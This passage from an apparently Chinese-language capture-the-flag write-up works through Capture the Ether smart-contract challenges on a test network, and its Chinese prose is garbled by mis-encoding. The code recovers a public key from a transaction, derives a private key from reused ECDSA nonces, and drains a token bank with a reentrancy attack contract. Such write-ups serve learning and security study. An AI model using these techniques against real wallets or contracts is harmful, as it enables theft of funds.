hashæ—¶æˆ‘ä»¬å¯ä»¥æ¢å¤å‡ºå…¬é’¥ã€‚</p><p>R ã€Sã€V å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•è·å¾—ï¼Œ é¦–å…ˆæ‰¾åˆ°ç”±è¿™ä¸ªè´¦æˆ·å‘èµ·çš„äº¤æ˜“ï¼Œç„¶åé€šè¿‡è„šæœ¬è®¡ç®—ï¼Œ å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/address/0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span></span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/getRawTx?tx=0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb</span></span><br><span class="line">    <span class="keyword">const</span> tx = ethers.utils.parseTransaction(<span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span>);</span><br><span class="line">    <span class="comment">// console.log(tx.r)</span></span><br><span class="line">    <span class="comment">// console.log(tx.s)</span></span><br><span class="line">    <span class="comment">// console.log(tx.v)</span></span><br><span class="line">      <span class="comment">// code to recover the public key from https://ethereum.stackexchange.com/questions/78815/ethers-js-recover-public-key-from-contract-deployment-via-v-r-s-values</span></span><br><span class="line">    <span class="keyword">const</span> expandedSig = &#123;</span><br><span class="line">        r: tx.r,</span><br><span class="line">        s: tx.s,</span><br><span class="line">        v: tx.v </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signature = ethers.utils.joinSignature(expandedSig);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: tx.gasPrice,</span><br><span class="line">        gasLimit: tx.gasLimit,</span><br><span class="line">        value: tx.value,</span><br><span class="line">        nonce: tx.nonce,</span><br><span class="line">        data: tx.data,</span><br><span class="line">        chainId: tx.chainId,</span><br><span class="line">        to: tx.to <span class="comment">// you might need to include this if it&#x27;s a regular txand not simply a contract deployment</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> rsTx = <span class="keyword">await</span> ethers.utils.resolveProperties(txData);</span><br><span class="line">    <span class="keyword">const</span> raw = ethers.utils.serializeTransaction(rsTx); <span class="comment">// returns RLPencoded tx</span></span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(raw); <span class="comment">// as specified byECDSA</span></span><br><span class="line">    <span class="keyword">const</span> msgBytes = ethers.utils.arrayify(msgHash); <span class="comment">// create binaryhash</span></span><br><span class="line">    <span class="keyword">const</span> recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes,signature);</span><br><span class="line">    <span class="comment">// recoveredPubKey is uncompressed, so starts with 0x04</span></span><br><span class="line">    <span class="keyword">const</span> compressedPubKey =</span><br><span class="line">ethers.utils.arrayify(recoveredPubKey).slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(compressedPubKey)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> answerPubKeyHex =</span><br><span class="line">Buffer.from(compressedPubKey).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`0x<span class="subst">$&#123;answerPubKeyHex&#125;</span>`</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="number">0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4</span></span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p><p><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">ç­¾åä¸æ ¡éªŒ :: ä»¥å¤ªåŠæŠ€æœ¯ä¸å®ç° (learnblockchain.cn)</a></p><h3 id="3-Account-Takeover"><a href="#3-Account-Takeover" class="headerlink" title="3. Account Takeover"></a>3. Account Takeover</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>To complete this challenge, send a transaction from theÂ <code>owner</code>â€˜s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=GBkT19uH2RQ">Pinky and The Brain Intro</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬è·å–è´¦æˆ·ç§é’¥</p><p>æ‰¾åˆ°è¯¥è´¦æˆ·çš„æ‰€æœ‰äº¤æ˜“ï¼Œå‘ç°æœ‰ä¸¤ç¬”äº¤æ˜“ä½¿ç”¨äº†åŒæ ·çš„ r</p><p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line">infura_url = <span class="string">&#x27;https://ropsten.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396</span></span><br><span class="line">s2 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">z2 = <span class="number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009</span></span><br><span class="line">s1 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">z1 = <span class="number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span></span><br><span class="line"><span class="comment"># prime order p</span></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"><span class="comment"># based on Fermat&#x27;s Little Theorem</span></span><br><span class="line"><span class="comment"># works only on prime n</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pow(a, n - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1-s2,p)%p               <span class="comment">#derivekfors1-s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p     <span class="comment"># derive private key </span></span><br><span class="line">pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p       <span class="comment">#-k(modp)of s1 - s2 == -s1 + s2, check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1+s2,p)%p <span class="comment">#derivekfors1+s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p <span class="comment"># derive private key pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p #-k(modp)of s1 + s2 == -s1 - s2, double check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line">acct =Account.from_key(<span class="string">&quot;614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;account addr &#123;:x&#125;&#x27;</span>.format(acct.address))</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ªè´¦æˆ·è°ƒç”¨ <code>authenticate</code> å‡½æ•°å³å¯ï¼š</p><p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p><p><a href="https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400">Smart Contract Exploits Part 3 â€” Featuring Capture the Ether (Accounts) | by Enigmatic | Coinmonks | Medium</a></p><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="1-Assume-ownership"><a href="#1-Assume-ownership" class="headerlink" title="1. Assume ownership"></a>1. Assume ownership</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>To complete this challenge, become theÂ <code>owner</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=ytc4_JJWqMQ">Owner Of A Lonely Heart</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>æ„é€ å‡½æ•°å­˜åœ¨æ‹¼å†™é”™è¯¯ , å¯¼è‡´åˆçº¦éƒ¨ç½²çš„æ—¶å€™è¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssumeOwnershipChallenge</span><br><span class="line">AssumeOwmershipChallenge</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨ <code>AssumeOwmershipChallenge</code> å‡½æ•°è®¾ç½® owner</p><h3 id="2-Token-bank"><a href="#2-Token-bank" class="headerlink" title="2. Token bank"></a>2. Token bank</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It usesÂ <a href="https://github.com/ethereum/EIPs/issues/223">ERC 223</a>Â to accept the incoming tokens.</p><p>The bank deploys a token called â€œSimple ERC223 Tokenâ€ and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    &#x2F;&#x2F; Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply &#x3D; 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] &#x3D; totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            &#x2F;&#x2F;retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length :&#x3D; extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;&#x3D; balanceOf[from]);</span><br><span class="line">        require(value &lt;&#x3D; allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token &#x3D; new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        &#x2F;&#x2F; the token contract&#39;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] &#x3D; 500000 * 10**18;  &#x2F;&#x2F; half for me</span><br><span class="line">        balanceOf[player] &#x3D; 500000 * 10**18;      &#x2F;&#x2F; half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;&#x3D; balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] +&#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=WDbOK_fDu9Y">A British Bank</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬å°† Bank çš„ä½™é¢æ¸…é›¶ã€‚</p><p><code>TokenBankChallenge.withdraw(uint256)</code>Â ä¸­å­˜åœ¨é‡å…¥æ¼æ´ï¼š</p><p>å®ƒå…ˆå‘å‡ºæ¶ˆæ¯è°ƒç”¨Â <code>token.transfer(msg.sender)</code>Â åä¿®æ”¹çŠ¶æ€</p><p>å‰è€…åˆä¼šå‘èµ·å¤–éƒ¨è°ƒç”¨Â <code>ITokenReceiver(to).tokenFallback()</code>ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">    ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­äº†toåœ°å€æ˜¯å¦æ˜¯ä¸ªåˆçº¦åœ°å€ï¼Œå¦‚æœæ˜¯åˆçº¦çš„è¯å°±ç”¨<code>ITokenReceiver</code>æ¥å£æ¥è°ƒç”¨<code>to</code>åˆçº¦çš„<code>tokenFallback</code>å‡½æ•°ï¼Œåœ¨é“¶è¡Œåˆçº¦é‡Œè¿™ä¸ªå‡½æ•°ç”¨æ›´æ”¹ç›®æ ‡çš„balanceï¼Œä½†æ˜¯<code>to</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ ï¼Œ æˆ‘ä»¬åªéœ€éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œä¸”è¯¥åˆçº¦ä¹Ÿå­˜åœ¨ <code>tokenFallback</code> å‡½æ•°ï¼Œç„¶åå‡½æ•°ä¸­å†è°ƒç”¨ <code>TokenBankChallenge.withdraw</code> , å°±å¯ä»¥åˆçº¦èº«ä»½æ‰§è¡Œ<code>withdraw</code>å‡½æ•°</p><p>æ­¥éª¤ï¼š</p><ol><li>éƒ¨ç½²æ”»å‡»åˆçº¦</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenBankChallenge &#123;</span><br><span class="line">    function token() external returns (address);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line">interface ISimpleERC223Token &#123;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool success); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankSolver &#123;</span><br><span class="line">    ITokenBankChallenge public challenge;</span><br><span class="line">    ISimpleERC223Token public token;</span><br><span class="line">    uint256 public balance &#x3D; 500000000000000000000000;</span><br><span class="line"></span><br><span class="line">    function TokenBankSolver(address _addr) public &#123;</span><br><span class="line">        challenge &#x3D; ITokenBankChallenge(_addr);</span><br><span class="line">        token &#x3D; ISimpleERC223Token(challenge.token());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns(uint256) &#123;</span><br><span class="line">            token.transfer(challenge, balance);</span><br><span class="line">            challenge.withdraw(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">            token.balanceOf(from); </span><br><span class="line">            require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">            uint256 challengeLeftBalance &#x3D; token.balanceOf(address(challenge));</span><br><span class="line">            bool keepRecursing &#x3D; challengeLeftBalance &gt; 0;</span><br><span class="line">            if (keepRecursing) &#123;</span><br><span class="line">                uint256 v &#x3D; value &lt; challengeLeftBalance? value: challengeLeftBalance;</span><br><span class="line">                challenge.withdraw(v);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns(bool) &#123;</span><br><span class="line">        return challenge.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>å°† Bankä¸­çš„ balance å…¨éƒ¨ææ¢æˆ Token -&gt; TokenBankChallenge.withdraw 